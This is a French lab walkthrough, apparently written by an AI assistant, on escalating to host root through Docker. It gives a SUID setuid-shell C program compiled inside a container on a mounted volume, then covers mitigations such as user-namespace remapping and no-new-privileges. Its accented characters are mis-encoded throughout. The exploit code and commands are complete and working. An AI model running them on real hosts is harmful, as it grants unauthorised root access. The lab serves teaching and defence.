# Docker et la S√©curit√© - Escalade de privil√®ges

Excellent exercice ! Je vais vous guider pour comprendre cette faille de s√©curit√©.

## Pr√©ambule : Concepts importants

### UID et EUID

* **UID (User ID)** : Identifiant de l'utilisateur r√©el
* **EUID (Effective User ID)** : Identifiant effectif utilis√© pour v√©rifier les permissions
* **Root = UID 0** : L'administrateur syst√®me

### Bit SUID (Set User ID)

* Permissions sp√©ciales : `chmod 6777`
* Le `6` active **SUID (4) + SGID (2)**
* Un fichier avec SUID s'ex√©cute avec les permissions de son  **propri√©taire** , pas de l'utilisateur qui le lance

---

## √âtape 1 : Test initial sur l'h√¥te

```bash
# Sur VM1 (en tant qu'utilisateur normal)
apt-get update
```

**R√©sultat attendu** :  Erreur de permission (vous n'√™tes pas root)

---

## √âtape 2 : Cr√©er le container avec volume mont√©

```bash
# Cr√©er un dossier de travail
mkdir ~/exploit-test
cd ~/exploit-test

# Lancer le container avec volume mont√©
docker run -it --rm -v $(pwd):/exploit ubuntu bash
```

**Important** : Vous √™tes maintenant **root dans le container** (UID 0), mais c'est un root "containeris√©".

---

## √âtape 3 : Dans le container - Cr√©er le programme malveillant

```bash
# Dans le container
cd /exploit

# Installer les outils n√©cessaires
apt update
apt install -y nano gcc

# Cr√©er le fichier exploit.c
nano exploit.c
```

Copiez ce code :

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char** argv) {
    setuid(0);
    printf("uid : %d - %d \n", geteuid(), getuid());
    system("/bin/sh");
    return 0;
}
```

**Ce que fait ce code** :

1. `setuid(0)` : Tente de devenir root (UID 0)
2. Affiche les UID effectif et r√©el
3. Lance un shell avec ces privil√®ges

### Compiler et configurer les permissions

```bash
# Compiler
gcc -o exploit.o exploit.c

# V√©rifier la compilation
ls -la exploit.o

# Appliquer les permissions SUID/SGID
chmod 6777 exploit.o

# V√©rifier les permissions
ls -la exploit.o
# Devrait afficher : -rwsrwsrwx ... exploit.o
#                      ^^^ ^^^
#                      SUID SGID

# Quitter le container
exit
```

---

## √âtape 4 : Sur l'h√¥te - Exploiter la faille

```bash
# Vous √™tes de retour sur VM1 (utilisateur normal)
cd ~/exploit-test
ls -la

# Regardez le propri√©taire du fichier
ls -la exploit.o
# Propri√©taire : root (car cr√©√© par root dans le container)
# Permissions : -rwsrwsrwx (SUID actif)

# Ex√©cuter le programme
./exploit.o
```

**R√©sultat attendu** :

```
uid : 0 - 0
#  (vous avez maintenant un shell root)
```

### Test de l'escalade

```bash
# Dans le nouveau shell (vous √™tes maintenant root)
whoami
# Devrait afficher : root

id
# uid=0(root) gid=0(root) ...

# Tester une commande root
apt-get update
# √áa fonctionne ! Vous √™tes root sans avoir tap√© de mot de passe !
```

---

## Explication de la faille

### Pourquoi √ßa fonctionne ?

1. **Dans le container** , vous √™tes root (UID 0)
2. Le **volume Docker mont√©** partage le syst√®me de fichiers entre container et h√¥te
3. Le fichier `exploit.o` est cr√©√© par root  **du container** , donc appartient √† root **de l'h√¥te**
4. Le bit **SUID (6777)** fait que le programme s'ex√©cute avec les permissions de son propri√©taire (root)
5. Sur l'h√¥te, un utilisateur normal peut ex√©cuter ce fichier, qui devient alors root gr√¢ce au SUID

### Sch√©ma de l'attaque

```
Container (vous = root UID 0)
    |
    | Cr√©√© exploit.o avec SUID
    | Propri√©taire : root
    |
    V
Volume mont√© (filesystem partag√©)
    |
    V
H√¥te (vous = user normal UID 1000)
    |
    | Ex√©cute exploit.o
    | SUID ‚Üí s'ex√©cute en tant que root
    |
    V
SHELL ROOT ! (escalade r√©ussie)
```

---

## Solutions de s√©curit√©

### Solution 1 : Retirer l'acc√®s Docker (NON acceptable selon le TP)

Le sujet dit explicitement qu'on **ne peut pas** retirer le droit de lancer des containers.

### Solution 2 : User Namespaces (Recommand√©)

**Probl√®me** : Le root du container = root de l'h√¥te (m√™me UID 0)

**Solution** : Remapper les UIDs avec les user namespaces

```bash
# Configuration sur l'h√¥te
sudo nano /etc/docker/daemon.json
```

Ajoutez :

```json
{
  "userns-remap": "default"
}
```

```bash
# Red√©marrer Docker
sudo systemctl restart docker

# Tester
docker run -it --rm ubuntu bash
# Dans le container
id
# uid=0(root) ... (dans le container)
# exit

# Sur l'h√¥te, le root du container est mapp√© vers un UID non-privil√©gi√© (ex: 100000)
```

**Avantage** : Le root du container n'est plus le root de l'h√¥te !

### Solution 3 : Option --user pour forcer un UID non-root

```bash
# Lancer le container avec un user sp√©cifique
docker run -it --rm --user 1000:1000 -v $(pwd):/exploit ubuntu bash

# Dans le container
id
# uid=1000 gid=1000 (pas root!)

# Les fichiers cr√©√©s n'appartiendront pas √† root
```

### Solution 4 : Interdire les volumes en √©criture sur des r√©pertoires sensibles

```bash
# Monter en lecture seule
docker run -it --rm -v $(pwd):/exploit:ro ubuntu bash

# Ou utiliser des restrictions SELinux/AppArmor
```

### Solution 5 : Option --security-opt no-new-privileges

```bash
docker run -it --rm --security-opt=no-new-privileges \
  -v $(pwd):/exploit ubuntu bash

# Emp√™che l'escalade via SUID
```

### Solution 6 : Surveiller les fichiers SUID sur l'h√¥te

```bash
# Trouver tous les fichiers avec SUID/SGID
find / -perm /6000 -type f 2>/dev/null

# Auditer r√©guli√®rement
```

---

## R√©ponse compl√®te √† la question du TP

### Qu'est-ce qui s'est pass√© ?

1. Docker partage les UIDs entre l'h√¥te et les containers par d√©faut
2. Le root du container (UID 0) = root de l'h√¥te (UID 0)
3. Le volume mont√© permet au container root de cr√©er des fichiers appartenant au root de l'h√¥te
4. Le bit SUID permet √† un ex√©cutable d'obtenir les privil√®ges de son propri√©taire
5. Un utilisateur normal peut ex√©cuter un fichier SUID appartenant √† root, devenant ainsi root

### Solutions en tant qu'administrateur

**Solution principale** : **User Namespaces**

* Remapper les UIDs des containers vers des UIDs non-privil√©gi√©s sur l'h√¥te
* Le root du container devient un utilisateur normal sur l'h√¥te
* Transparent pour les utilisateurs

**Solutions compl√©mentaires** :

* Utiliser `--user` pour forcer des containers non-root
* `--security-opt no-new-privileges` pour bloquer les escalades SUID
* Auditer r√©guli√®rement les fichiers SUID suspects
* Restreindre les volumes montables (SELinux/AppArmor)
* Former les utilisateurs aux bonnes pratiques

---

## üß™ Test de la solution User Namespaces

```bash
# Configurer user namespaces
sudo nano /etc/docker/daemon.json
```

```json
{
  "userns-remap": "default",
  "insecure-registries": ["192.168.X.X:5000"]
}
```

```bash
sudo systemctl restart docker

# Refaire l'attaque
docker run -it --rm -v ~/exploit-test2:/exploit ubuntu bash

# Dans le container
cd /exploit
apt update && apt install -y gcc
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0);
    printf("uid : %d - %d \n", geteuid(), getuid());
    system("/bin/sh");
    return 0;
}
EOF

gcc -o exploit.o exploit.c
chmod 6777 exploit.o
exit

# Sur l'h√¥te
cd ~/exploit-test2
ls -la exploit.o
# Propri√©taire : 100000:100000 (pas root!)

./exploit.o
# L'escalade √©choue !
```
